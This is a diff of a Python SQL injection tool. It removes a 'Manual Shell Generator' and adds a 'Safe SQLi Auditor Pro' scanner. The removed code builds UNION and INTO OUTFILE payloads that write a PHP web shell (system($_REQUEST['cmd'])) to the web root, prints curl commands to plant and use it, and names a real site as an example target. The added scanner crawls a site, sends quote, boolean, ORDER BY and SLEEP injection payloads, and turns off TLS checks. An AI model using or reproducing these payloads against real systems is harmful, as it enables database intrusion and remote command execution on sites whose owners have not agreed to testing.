@@ -1,294 +1,686 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-# --[MAI]-- Manual Shell Generator
-# Author: JunedXsec
-# Version: 5.1 - Fixed for Termux
+# =========================================================
+# SAFE SQLi AUDITOR PRO
+# Single File Edition
+# For Security Testing & Learning Only
+# =========================================================
 
-import sys
 import os
 import re
 import time
 import random
+import threading
 import urllib.parse
+
 from html.parser import HTMLParser
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from collections import OrderedDict
-import threading
 
 import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
 
-# ==================== KONFIGURASI ====================
+# =========================================================
+# CONFIG
+# =========================================================
+
 TIMEOUT = 15
-DELAY = 0.5
-MAX_THREADS = 2
-MAX_COLUMNS = 30
-RETRY_COUNT = 2
+DELAY = 0.3
+MAX_THREADS = 5
+MAX_COLUMNS = 15
+CRAWL_DEPTH = 1
 
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
-]
+# =========================================================
+# COLORS
+# =========================================================
 
 C = {
-    'INFO': '\033[92m',
-    'ERROR': '\033[91m',
-    'SUCCESS': '\033[94m',
-    'WARNING': '\033[93m',
-    'RESET': '\033[0m',
-    'BOLD': '\033[1m',
-    'CYAN': '\033[96m'
+    "RED": "\033[91m",
+    "GREEN": "\033[92m",
+    "YELLOW": "\033[93m",
+    "BLUE": "\033[94m",
+    "CYAN": "\033[96m",
+    "WHITE": "\033[97m",
+    "BOLD": "\033[1m",
+    "END": "\033[0m"
 }
 
+# =========================================================
+# USER AGENTS
+# =========================================================
+
+USER_AGENTS = [
+    "Mozilla/5.0 (Linux; Android 14)",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    "Mozilla/5.0 (X11; Linux x86_64)",
+]
+
+# =========================================================
+# THREAD SAFE PRINT
+# =========================================================
+
 print_lock = threading.Lock()
+
 def safe_print(msg):
     with print_lock:
         print(msg)
 
-def clear_screen():
-    os.system('clear' if os.name == 'posix' else 'cls')
+# =========================================================
+# LOGGER
+# =========================================================
 
-def log_info(msg): safe_print(f"{C['INFO']}[INFO]{C['RESET']} {msg}")
-def log_error(msg): safe_print(f"{C['ERROR']}[ERROR]{C['RESET']} {msg}")
-def log_success(msg): safe_print(f"{C['SUCCESS']}[SUCCESS]{C['RESET']} {msg}")
-def log_warning(msg): safe_print(f"{C['WARNING']}[WARNING]{C['RESET']} {msg}")
-def log_banner():
-    safe_print(f"{C['BOLD']}{C['CYAN']}--[MAI]-- Manual Shell Generator{C['RESET']}")
-    safe_print(f"{C['BOLD']}Author: JunedXsec{C['RESET']}")
-    safe_print("Mode: Tidak auto upload, hanya generate payload untuk dieksekusi manual")
-    safe_print("")   # Baris kosong (sudah pakai argumen)
+def info(msg):
+    safe_print(f"{C['CYAN']}[INFO]{C['END']} {msg}")
 
-# ==================== HTTP ====================
+def success(msg):
+    safe_print(f"{C['GREEN']}[FOUND]{C['END']} {msg}")
+
+def warning(msg):
+    safe_print(f"{C['YELLOW']}[WARN]{C['END']} {msg}")
+
+def error(msg):
+    safe_print(f"{C['RED']}[ERROR]{C['END']} {msg}")
+
+# =========================================================
+# BANNER
+# =========================================================
+
+def banner():
+
+    os.system("clear")
+
+    print(f"""{C['BOLD']}{C['BLUE']}
+╔══════════════════════════════════════════════╗
+║           SAFE SQLi AUDITOR PRO             ║
+║         Professional Single File            ║
+╚══════════════════════════════════════════════╝
+{C['END']}""")
+
+# =========================================================
+# SESSION
+# =========================================================
+
 session = requests.Session()
-session.verify = False
 
-def fetch(url, params=None, post_data=None, retry=RETRY_COUNT):
-    time.sleep(DELAY)
-    session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
-    for attempt in range(retry):
-        try:
-            if params:
-                resp = session.get(url, params=params, timeout=TIMEOUT, allow_redirects=True)
-            elif post_data:
-                resp = session.post(url, data=post_data, timeout=TIMEOUT, allow_redirects=True)
-            else:
-                resp = session.get(url, timeout=TIMEOUT, allow_redirects=True)
-            resp.encoding = 'utf-8'
-            return resp
-        except Exception as e:
-            if attempt == retry-1:
-                log_error(f"Request failed: {str(e)[:60]}")
-                return None
-            time.sleep(1)
-    return None
+retry = Retry(
+    total=2,
+    backoff_factor=1,
+    status_forcelist=[500, 502, 503, 504]
+)
 
-# ==================== CRAWLER ====================
+adapter = HTTPAdapter(max_retries=retry)
+
+session.mount("http://", adapter)
+session.mount("https://", adapter)
+
+# =========================================================
+# REQUEST
+# =========================================================
+
+def request(url, method="GET", params=None, data=None):
+
+    headers = {
+        "User-Agent": random.choice(USER_AGENTS)
+    }
+
+    try:
+
+        time.sleep(DELAY)
+
+        if method == "POST":
+
+            r = session.post(
+                url,
+                data=data,
+                headers=headers,
+                timeout=TIMEOUT,
+                verify=False,
+                allow_redirects=True
+            )
+
+        else:
+
+            r = session.get(
+                url,
+                params=params,
+                headers=headers,
+                timeout=TIMEOUT,
+                verify=False,
+                allow_redirects=True
+            )
+
+        r.encoding = "utf-8"
+
+        return r
+
+    except Exception as e:
+
+        error(str(e))
+        return None
+
+# =========================================================
+# PARSER
+# =========================================================
+
 class SmartParser(HTMLParser):
+
     def __init__(self, base_url):
+
         super().__init__()
+
         self.base_url = base_url
+
         self.links = []
         self.forms = []
-        self.params_found = set()
+
     def handle_starttag(self, tag, attrs):
+
         attrs = dict(attrs)
-        if tag == 'a' and 'href' in attrs:
-            href = attrs['href']
-            full = urllib.parse.urljoin(self.base_url, href)
-            self.links.append(full)
-            if '?' in full:
-                parsed = urllib.parse.urlparse(full)
-                if parsed.query:
-                    for key in urllib.parse.parse_qs(parsed.query).keys():
-                        self.params_found.add(key)
-        elif tag == 'form':
-            action = attrs.get('action', '')
-            method = attrs.get('method', 'get').lower()
-            full_action = urllib.parse.urljoin(self.base_url, action)
-            self.forms.append([full_action, method, []])
-        elif tag == 'input' and self.forms:
-            name = attrs.get('name')
+
+        # LINKS
+        if tag == "a":
+
+            href = attrs.get("href")
+
+            if href:
+
+                full = urllib.parse.urljoin(
+                    self.base_url,
+                    href
+                )
+
+                self.links.append(full)
+
+        # FORMS
+        elif tag == "form":
+
+            action = attrs.get("action", "")
+            method = attrs.get("method", "get").lower()
+
+            full_action = urllib.parse.urljoin(
+                self.base_url,
+                action
+            )
+
+            self.forms.append({
+                "action": full_action,
+                "method": method,
+                "inputs": []
+            })
+
+        # INPUTS
+        elif tag == "input" and self.forms:
+
+            name = attrs.get("name")
+
             if name:
-                self.forms[-1][2].append(name)
+                self.forms[-1]["inputs"].append(name)
 
-def extract_params_from_url(url):
+# =========================================================
+# UTILITIES
+# =========================================================
+
+def extract_params(url):
+
     parsed = urllib.parse.urlparse(url)
-    if parsed.query:
-        return {k: v[0] for k, v in urllib.parse.parse_qs(parsed.query).items()}
-    return {}
 
-def discover_endpoints(target):
-    log_info(f"Memulai Scanning SQLi Vuln Ke Site: {target}")
-    resp = fetch(target)
-    if not resp or resp.status_code != 200:
-        log_error("Gagal mengakses website")
-        return [], []
-    parser = SmartParser(target)
-    parser.feed(resp.text)
-    
-    get_endpoints = []
-    seen_urls = set()
-    for link in parser.links:
-        params = extract_params_from_url(link)
-        if params and link not in seen_urls:
-            seen_urls.add(link)
-            get_endpoints.append((link, params))
-    orig_params = extract_params_from_url(target)
-    if orig_params and target not in seen_urls:
-        get_endpoints.insert(0, (target, orig_params))
-    
-    post_forms = [(action, method, inputs) for action, method, inputs in parser.forms if method == 'post' and inputs]
-    log_info(f"Ditemukan {len(get_endpoints)} URL dengan parameter")
-    if parser.params_found:
-        log_info(f"Nama parameter: {', '.join(list(parser.params_found)[:5])}")
-    return get_endpoints, post_forms
+    query = urllib.parse.parse_qs(parsed.query)
 
-# ==================== INJECTION DETECTION ====================
-def test_injection(url, param, orig_value, original_content):
-    log_info("Mencari Metode Injection Di Website string_based/numeric_based")
-    test_payload = "'"
-    log_info(f"Menggunakan Payload: {urllib.parse.quote(test_payload)}")
-    params = {param: f"{orig_value}{test_payload}"}
-    resp = fetch(url, params=params)
-    if resp and resp.status_code == 200 and resp.text != original_content:
-        log_info("tipeinjeksi Menggunakan Metode String Based")
-        return "string", "'"
-    test_payload2 = " AND 1=2"
-    params2 = {param: f"{orig_value}{test_payload2}"}
-    resp2 = fetch(url, params=params2)
-    if resp2 and resp2.status_code == 200 and resp2.text != original_content:
-        log_info("tipeinjeksi Menggunakan Metode Numeric Based")
-        return "numeric", ""
-    true_payload = f"{orig_value}' AND '1'='1"
-    false_payload = f"{orig_value}' AND '1'='2"
-    r_true = fetch(url, params={param: true_payload})
-    r_false = fetch(url, params={param: false_payload})
-    if r_true and r_false and r_true.text != r_false.text:
-        log_info("tipeinjeksi Menggunakan Metode Boolean Blind")
-        return "boolean", "' AND '1'='1"
-    return None, None
+    result = {}
 
-def count_columns(url, param, original_value, inj_type, trigger):
-    log_info("Mencari Column...")
-    for cols in range(1, MAX_COLUMNS+1):
-        if inj_type == "string":
-            payload = f"{original_value}{trigger} ORDER BY {cols}-- -"
-        else:
-            payload = f"{original_value}{trigger} ORDER BY {cols}-- -"
-        params = {param: payload}
-        resp = fetch(url, params=params)
-        if not resp:
-            continue
-        if "Unknown column" in resp.text or "error" in resp.text.lower():
-            log_info(f"Menghitung Order By: {cols-1}")
-            return cols-1
-    log_info(f"Menghitung Order By: {MAX_COLUMNS}")
-    return MAX_COLUMNS
+    for k, v in query.items():
 
-def union_extract(url, param, original_value, inj_type, trigger, num_cols):
-    markers = ','.join([str(i*11) for i in range(1, num_cols+1)])
-    if inj_type == "string":
-        payload = f"{original_value}{trigger} AND 0 UNION SELECT {markers}-- -"
-    else:
-        payload = f"{original_value}{trigger} AND 0 UNION SELECT {markers}-- -"
-    log_info(f"Mencoba Payload: {payload[:80]}...")
-    params = {param: payload}
-    resp = fetch(url, params=params)
-    if resp and resp.status_code == 200:
-        found = re.findall(r'\b(11|22|33|44|55|66|77|88|99|110|121|132|143|154|165|176|187|198|209|220)\b', resp.text)
-        if found:
-            visible = list(OrderedDict.fromkeys(found))
-            log_info(f"Angka Yang Muncul: {', '.join(visible)}")
-            parsed = urllib.parse.urlparse(url)
-            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
-            payload_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
-            log_info(f"Payload Union: {payload_url}")
+        result[k] = v[0]
+
+    return result
+
+def normalize_endpoint(url):
+
+    parsed = urllib.parse.urlparse(url)
+
+    return parsed.path
+
+# =========================================================
+# DBMS GUESS
+# =========================================================
+
+def fingerprint_dbms(text):
+
+    text = text.lower()
+
+    if "mysql" in text:
+        return "MySQL"
+
+    if "mariadb" in text:
+        return "MariaDB"
+
+    if "postgresql" in text:
+        return "PostgreSQL"
+
+    if "sqlite" in text:
+        return "SQLite"
+
+    if "oracle" in text:
+        return "Oracle"
+
+    if "microsoft sql" in text or "sql server" in text:
+        return "MSSQL"
+
+    return "Unknown"
+
+# =========================================================
+# WAF DETECTION
+# =========================================================
+
+def detect_waf(headers):
+
+    headers = str(headers).lower()
+
+    wafs = {
+        "cloudflare": "Cloudflare",
+        "sucuri": "Sucuri",
+        "imperva": "Imperva",
+        "mod_security": "ModSecurity",
+        "aws": "AWS WAF"
+    }
+
+    for key, value in wafs.items():
+
+        if key in headers:
+            return value
+
+    return "Not Detected"
+
+# =========================================================
+# SQL ERRORS
+# =========================================================
+
+SQL_ERRORS = [
+    "sql syntax",
+    "mysql_fetch",
+    "syntax error",
+    "quoted string",
+    "unclosed quotation",
+    "pdoexception",
+    "warning: mysql",
+    "mysqli",
+    "postgresql",
+    "sqlite error",
+    "oracle error",
+]
+
+# =========================================================
+# CHECK SQLI
+# =========================================================
+
+def is_sqli(original, modified):
+
+    if not modified:
+        return False
+
+    text = modified.text.lower()
+
+    for err in SQL_ERRORS:
+
+        if err in text:
             return True
+
+    if len(original.text) != len(modified.text):
+        return True
+
     return False
 
-def generate_shell_payload(base_url, param, original_value, trigger, num_cols, shell_path):
-    shell_code = "<?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}?>"
-    nulls = ['NULL'] * num_cols
-    nulls[0] = f"'{shell_code}'"
-    # Gunakan trigger yang sudah dideteksi (biasanya "'" untuk string based)
-    payload = f"{original_value}{trigger} UNION SELECT {','.join(nulls)} INTO OUTFILE '{shell_path}'-- -"
-    full_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
-    return full_url, payload
+# =========================================================
+# COLUMN COUNT
+# =========================================================
 
-def scan_endpoint(url, params_dict):
-    for param, orig_val in params_dict.items():
-        log_info(f"Mencari Parameter Pada Url...")
-        log_info("Url Memiliki Parameter")
-        orig_resp = fetch(url)
-        if not orig_resp:
+def count_columns(url, param, value):
+
+    for i in range(1, MAX_COLUMNS + 1):
+
+        payload = f"{value}' ORDER BY {i}-- -"
+
+        r = request(
+            url,
+            params={param: payload}
+        )
+
+        if not r:
             continue
-        original_content = orig_resp.text
-        log_info("Berhasil Mengambil Konten Default Pada Website")
-        inj_type, trigger = test_injection(url, param, orig_val, original_content)
-        if not inj_type:
+
+        text = r.text.lower()
+
+        if "unknown column" in text or "order by" in text:
+
+            return i - 1
+
+    return None
+
+# =========================================================
+# BOOLEAN TEST
+# =========================================================
+
+def boolean_test(url, param, value):
+
+    true_payload = f"{value}' AND '1'='1"
+    false_payload = f"{value}' AND '1'='2"
+
+    r1 = request(url, params={param: true_payload})
+    r2 = request(url, params={param: false_payload})
+
+    if not r1 or not r2:
+        return False
+
+    return len(r1.text) != len(r2.text)
+
+# =========================================================
+# TIME TEST
+# =========================================================
+
+def time_test(url, param, value):
+
+    start = time.time()
+
+    payload = f"{value}' AND SLEEP(3)-- -"
+
+    request(url, params={param: payload})
+
+    end = time.time()
+
+    return (end - start) >= 3
+
+# =========================================================
+# CRAWLER
+# =========================================================
+
+def crawl(target):
+
+    info(f"Crawling: {target}")
+
+    r = request(target)
+
+    if not r:
+        return [], []
+
+    parser = SmartParser(target)
+
+    parser.feed(r.text)
+
+    get_targets = []
+    post_targets = []
+
+    seen = set()
+
+    # GET
+    for link in parser.links:
+
+        if "?" not in link:
             continue
-        num_cols = count_columns(url, param, orig_val, inj_type, trigger)
-        if num_cols < 1:
+
+        norm = normalize_endpoint(link)
+
+        if norm in seen:
             continue
-        log_info(f"Jumlah Column: {num_cols}")
-        if union_extract(url, param, orig_val, inj_type, trigger, num_cols):
-            log_success(f"Parameter {param} rentan! Sekarang generate shell.")
-            while True:
-                sys.stdout.write(f"\n{C['WARNING']}[?] Buat shell? (y/n): {C['RESET']}")
-                sys.stdout.flush()
-                ans = sys.stdin.readline().strip().lower()
-                if ans == 'y':
-                    parsed = urllib.parse.urlparse(url)
-                    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
-                    default_path = "/var/www/html/shell.php"
-                    sys.stdout.write(f"{C['CYAN']}Masukkan path shell (default: {default_path}): {C['RESET']}")
-                    sys.stdout.flush()
-                    shell_path = sys.stdin.readline().strip()
-                    if not shell_path:
-                        shell_path = default_path
-                    full_url, raw_payload = generate_shell_payload(base_url, param, orig_val, trigger, num_cols, shell_path)
-                    print(f"\n{C['SUCCESS']}========= SHELL PAYLOAD (COPY INI) ========={C['RESET']}")
-                    print(f"{C['BOLD']}URL LENGKAP:{C['RESET']}\n{full_url}")
-                    print(f"\n{C['BOLD']}Atau perintah curl:{C['RESET']}")
-                    print(f"curl -A 'Mozilla/5.0' '{full_url}'")
-                    print(f"\n{C['BOLD']}Untuk eksekusi command nanti:{C['RESET']}")
-                    print(f"curl -A 'Mozilla/5.0' '{shell_path}?cmd=id'")
-                    print(f"{C['SUCCESS']}============================================{C['RESET']}")
-                    break
-                elif ans == 'n':
-                    break
-        break
+
+        seen.add(norm)
+
+        params = extract_params(link)
+
+        if params:
+            get_targets.append((link, params))
+
+    # POST
+    for form in parser.forms:
+
+        if form["method"] == "post":
+            post_targets.append(form)
+
+    info(f"GET endpoints : {len(get_targets)}")
+    info(f"POST forms    : {len(post_targets)}")
+
+    return get_targets, post_targets
+
+# =========================================================
+# RESULT DISPLAY
+# =========================================================
+
+def show_result(
+    url,
+    param,
+    method,
+    sqli_type,
+    dbms,
+    waf,
+    cols,
+    status,
+    diff
+):
+
+    print(f"""
+{C['GREEN']}=================================================={C['END']}
+
+{C['BOLD']}[FOUND] Possible SQL Injection{C['END']}
+
+URL         : {url}
+Parameter   : {param}
+Method      : {method}
+Type        : {sqli_type}
+DBMS Guess  : {dbms}
+Columns     : {cols}
+HTTP Code   : {status}
+Difference  : {diff} bytes
+WAF         : {waf}
+
+Safe PoC:
+{url}
+
+{C['GREEN']}=================================================={C['END']}
+""")
+
+# =========================================================
+# GET SCAN
+# =========================================================
+
+def scan_get(url, params):
+
+    info(f"Scanning GET: {url}")
+
+    original = request(url)
+
+    if not original:
+        return
+
+    for param, value in params.items():
+
+        payload = f"{value}'"
+
+        modified = request(
+            url,
+            params={param: payload}
+        )
+
+        if not modified:
+            continue
+
+        if is_sqli(original, modified):
+
+            dbms = fingerprint_dbms(modified.text)
+
+            waf = detect_waf(modified.headers)
+
+            cols = count_columns(url, param, value)
+
+            boolean_based = boolean_test(
+                url,
+                param,
+                value
+            )
+
+            time_based = time_test(
+                url,
+                param,
+                value
+            )
+
+            sqli_type = "Error-Based"
+
+            if boolean_based:
+                sqli_type += " + Boolean-Based"
+
+            if time_based:
+                sqli_type += " + Time-Based"
+
+            diff = abs(
+                len(original.text) - len(modified.text)
+            )
+
+            poc = (
+                f"{url.split('?')[0]}"
+                f"?{param}={urllib.parse.quote(payload)}"
+            )
+
+            show_result(
+                poc,
+                param,
+                "GET",
+                sqli_type,
+                dbms,
+                waf,
+                cols,
+                modified.status_code,
+                diff
+            )
+
+# =========================================================
+# POST SCAN
+# =========================================================
+
+def scan_post(form):
+
+    action = form["action"]
+
+    inputs = form["inputs"]
+
+    if not inputs:
+        return
+
+    info(f"Scanning POST: {action}")
+
+    data = {}
+
+    for inp in inputs:
+        data[inp] = "test"
+
+    original = request(
+        action,
+        method="POST",
+        data=data
+    )
+
+    if not original:
+        return
+
+    for inp in inputs:
+
+        payload_data = data.copy()
+
+        payload_data[inp] = "test'"
+
+        modified = request(
+            action,
+            method="POST",
+            data=payload_data
+        )
+
+        if not modified:
+            continue
+
+        if is_sqli(original, modified):
+
+            dbms = fingerprint_dbms(modified.text)
+
+            waf = detect_waf(modified.headers)
+
+            diff = abs(
+                len(original.text) - len(modified.text)
+            )
+
+            show_result(
+                action,
+                inp,
+                "POST",
+                "Error-Based",
+                dbms,
+                waf,
+                "-",
+                modified.status_code,
+                diff
+            )
+
+# =========================================================
+# MAIN
+# =========================================================
 
 def main():
-    clear_screen()
-    log_banner()
-    raw_target = input(f"{C['BOLD']}Masukkan URL target (contoh: https://example.com/page.php?id=1){C['RESET']}\n> ").strip()
-    if not raw_target:
-        log_error("URL tidak boleh kosong")
-        sys.exit(1)
-    target = raw_target.split()[0]
-    if not target.startswith(('http://','https://')):
-        target = 'http://' + target
-    target = re.sub(r'[)\]}>]+$', '', target)
-    
-    get_endpoints, post_forms = discover_endpoints(target)
-    if not get_endpoints and not post_forms:
-        log_error("Tidak ditemukan parameter GET atau form POST.")
-        log_warning("Contoh URL yang memiliki parameter: https://www.baizidsteel.com.bd/news.php?id=23")
-        sys.exit(1)
-    
-    log_info(f"Memulai scan pada {len(get_endpoints)} endpoint GET")
+
+    banner()
+
+    target = input(
+        f"{C['BOLD']}Target URL:{C['END']} "
+    ).strip()
+
+    if not target.startswith(("http://", "https://")):
+        target = "http://" + target
+
+    get_targets, post_targets = crawl(target)
+
+    if not get_targets and not post_targets:
+
+        warning("No parameters/forms found")
+        return
+
+    futures = []
+
     with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
-        futures = [executor.submit(scan_endpoint, url, params) for url, params in get_endpoints]
+
+        # GET
+        for url, params in get_targets:
+
+            futures.append(
+                executor.submit(
+                    scan_get,
+                    url,
+                    params
+                )
+            )
+
+        # POST
+        for form in post_targets:
+
+            futures.append(
+                executor.submit(
+                    scan_post,
+                    form
+                )
+            )
+
         for future in as_completed(futures):
+
             try:
                 future.result()
+
             except Exception as e:
-                log_error(f"Thread error: {e}")
-    
-    log_success("Scan selesai.")
+                error(str(e))
+
+    success("Scan Finished")
+
+# =========================================================
+# ENTRY
+# =========================================================
 
 if __name__ == "__main__":
+
+    requests.packages.urllib3.disable_warnings()
+
     main()
